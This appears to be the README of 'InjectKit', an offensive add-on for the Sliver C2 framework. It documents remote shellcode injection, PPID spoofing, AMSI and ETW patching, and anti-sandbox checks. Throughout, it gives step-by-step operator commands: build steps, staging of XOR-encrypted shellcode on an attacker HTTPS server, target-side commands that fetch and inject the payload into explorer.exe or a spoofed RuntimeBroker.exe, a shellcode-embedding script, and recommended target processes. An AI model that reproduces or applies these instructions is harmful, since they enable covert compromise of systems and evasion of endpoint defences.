# InjectKit

Remote process injection with PPID spoofing for Sliver C2. Part of the **Sliver Defense Evasion Suite**.

Fetches XOR-encrypted shellcode from the operator's HTTPS server and injects it into a remote process via NT-native APIs. No RWX pages. No kernel32 VirtualAlloc. Optional PPID spoofing hides the injected process behind a legitimate parent.

---

## What It Does

Two injection modes:

**Inject into an existing process** (`target=`)  
Finds a running process by name, opens it via `NtOpenProcess`, allocates RW memory in it, writes shellcode, flips to RX, and creates a remote thread via `NtCreateThreadEx`. Your Sliver beacon ends up living inside `explorer.exe` — the injector exits immediately.

**Spawn + inject with PPID spoofing** (`spawn=` + `ppid=`)  
Spawns a sacrificial process (e.g., `RuntimeBroker.exe`) suspended, with its reported parent spoofed to a legitimate process (e.g., `explorer.exe`) via `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS`. Injects shellcode into the new process. From the OS and EDR's perspective, `RuntimeBroker.exe` was started by `explorer.exe` — not by your injector.

---

## Evasion Stack

| Layer | Technique |
|-------|-----------|
| **No RWX** | Remote alloc RW → write → protect RX — memory is never simultaneously writable and executable |
| **NT-native APIs** | `NtAllocateVirtualMemory`, `NtWriteVirtualMemory`, `NtProtectVirtualMemory`, `NtCreateThreadEx` — bypasses EDR hooks on kernel32 `VirtualAllocEx`/`WriteProcessMemory` |
| **PPID spoofing** | `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` makes spawned process appear to have a legitimate parent |
| **AMSI bypass** | `AmsiScanBuffer` patched to return `E_INVALIDARG` (standalone EXE only) |
| **ETW blind** | `EtwEventWrite` patched to `ret` — process emits no ETW events (standalone EXE only) |
| **Anti-sandbox** | Sleep timing + CPU count checks — exits silently in automated environments (standalone EXE only) |
| **HTTPS staging** | Self-signed ECDSA P-256, randomised URL, one-shot server shuts down after one download |
| **XOR-32 in-transit** | Shellcode XOR-encrypted before serving; decrypted only inside the target process |

---

## Prerequisites

- **Go 1.21+**: `go version`
- **mingw-w64**: `apt install mingw-w64`

---

## Setup

```bash
cd Inject-Kit/injectkit
make all
```

Expected output:
```
go build -o injectkit ./cmd/injectkit
GOOS=windows GOARCH=amd64 ... go build ... -o build/injectkit.exe ./runner
make -C c/inject → inject.x64.dll
./injectkit bundle --output build/inject-0.1.0.tar.gz
```

Or build components separately:
```bash
make cli      # operator CLI only → ./injectkit
make runner   # standalone Windows EXE → build/injectkit.exe
make ext      # Sliver Extension DLL → build/inject.x64.dll
make bundle   # package into Sliver extension tarball → build/inject-0.1.0.tar.gz
```

---

## Usage

### Step 1: Generate or obtain shellcode

Any raw shellcode blob works — Sliver shellcode, MaskKit output, PalaceKit output:

```bash
# Sliver shellcode
sliver > generate --format shellcode --os windows --arch amd64 --mtls YOUR_IP --save implant.bin

# MaskKit-wrapped (sleep masking + stack spoof)
./maskkit wrap --shellcode implant.bin --output masked.bin

# PalaceKit-wrapped (Crystal Palace loader)
./palacekit build --shellcode implant.bin --output palace.bin
```

### Step 2: Encrypt and stage

```bash
./injectkit stage \
    --shellcode implant.bin \
    --url https://192.168.1.10:8443/p \
    --serve
```

Output:
```
[*] Shellcode: 589824 bytes
[+] payload → build/payload.enc (589824 bytes)
[+] key     → a1b2c3d4e5f6...

[i] Standalone (injectkit.exe on target):
    injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -target explorer.exe
    injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe

[i] Sliver Extension (after: extensions install build/inject-0.1.0.tar.gz):
    sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... target=explorer.exe
    sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe

[*] One-shot HTTPS server on :8443 (shuts down after one download)
[+] Payload URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
```

---

## Option A: Standalone (no Sliver session required)

Upload `injectkit.exe` to the target and run it directly.

**Inject into explorer.exe:**
```
injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -target explorer.exe
```

**Spawn RuntimeBroker.exe with explorer.exe as spoofed parent, inject into it:**
```
injectkit.exe -mode stager -url https://192.168.1.10:8443/p -key a1b2c3... -spawn RuntimeBroker.exe -ppid explorer.exe
```

**Direct mode (shellcode baked in — no staging server needed):**

First, generate the embedded bytes:
```bash
python3 -c "
import os, sys
key = os.urandom(32)
sc  = open(sys.argv[1], 'rb').read()
enc = bytes(b ^ key[i % len(key)] for i, b in enumerate(sc))
print('var xorKey = []byte{' + ', '.join(hex(b) for b in key) + '}')
print('var encShellcode = []byte{' + ', '.join(hex(b) for b in enc) + '}')
" implant.bin
```

Paste the output into `runner/shellcode.go`, then recompile:
```bash
make runner
```

Run with no staging server:
```
injectkit.exe -mode direct -target explorer.exe
```

---

## Option B: Sliver Extension (requires active session)

Install the extension once per Sliver server:

```bash
make all
```

In Sliver:
```
sliver (TARGET)> extensions install build/inject-0.1.0.tar.gz
[*] Installing extension 'inject' (v0.1.0) ... done
```

**Inject into existing process:**
```
sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... target=explorer.exe
[+] injected into explorer.exe (pid 1234) — shellcode running
```

**Spawn + inject with PPID spoof:**
```
sliver (TARGET)> inject url=https://192.168.1.10:8443/p key=a1b2c3... spawn=RuntimeBroker.exe ppid=explorer.exe
[+] spawned RuntimeBroker.exe (pid 5678) with ppid spoofed to explorer.exe — shellcode running
```

---

## Command Reference

### `injectkit stage`

```
Flags:
  --shellcode string   path to shellcode .bin file (required)
  --url string         HTTPS URL the target will fetch the payload from (required)
  -o string            output directory for payload.enc (default: build)
  --serve              start one-time HTTPS server after encrypting
  --port int           HTTPS port (default: 8443)
```

### `injectkit serve`

```
Flags:
  --payload string   path to payload.enc (required)
  --port int         HTTPS port (default: 8443)
```

### `injectkit bundle`

```
Flags:
  --output string   output tarball path (default: build/inject-0.1.0.tar.gz)
```

### `injectkit.exe` (standalone runner)

```
Flags:
  -mode string    stager | direct (default: stager)
  -url string     shellcode URL (stager mode)
  -key string     hex XOR key (stager mode)
  -target string  inject into this running process (e.g. explorer.exe)
  -spawn string   spawn this process and inject into it
  -ppid string    process to spoof as parent when using -spawn (default: explorer.exe)
```

### Sliver Extension: `inject`

```
sliver (TARGET)> inject url=<url> key=<64 hex chars> target=<process.exe>
sliver (TARGET)> inject url=<url> key=<64 hex chars> spawn=<process.exe> ppid=<parent.exe>
```

---

## Recommended Target Processes

| Process | Notes |
|---------|-------|
| `explorer.exe` | Always running as the user, very common injection target |
| `RuntimeBroker.exe` | Legitimate Windows broker process, low suspicion |
| `svchost.exe` | Common, but requires SYSTEM privileges to open |
| `dllhost.exe` | COM surrogate, spawned frequently by legitimate software |
| `SearchHost.exe` | Windows Search host, user-level |

---

## File Structure

```
injectkit/
├── cmd/injectkit/
│   └── main.go          # operator CLI (stage / serve / bundle)
├── runner/              # standalone Windows EXE source
│   ├── main.go          # flags + orchestration
│   ├── nt.go            # shared NT API + kernel32 declarations
│   ├── inject.go        # NT-native remote process injection
│   ├── ppid.go          # PPID spoofing + process spawn
│   ├── proc.go          # process enumeration (TH32CS snapshot)
│   ├── opsec.go         # AMSI/ETW patch, anti-sandbox
│   ├── stager.go        # HTTPS fetch + XOR decrypt
│   └── shellcode.go     # embedded shellcode (direct mode)
├── c/inject/
│   ├── inject.c         # Sliver Extension DLL
│   └── Makefile
├── build/               # compiled artifacts
├── extension.json       # Sliver Extension manifest
├── go.mod
└── Makefile
```
